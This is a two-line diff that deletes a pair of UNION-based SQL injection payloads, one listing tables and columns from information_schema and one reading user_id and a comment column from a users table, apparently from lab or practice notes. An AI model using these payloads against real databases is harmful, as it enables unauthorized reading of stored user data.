@@ -1,2 +1,0 @@
- 1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns 
- 1 AND 1=2 UNION SELECT user_id, Commentaire FROM users  
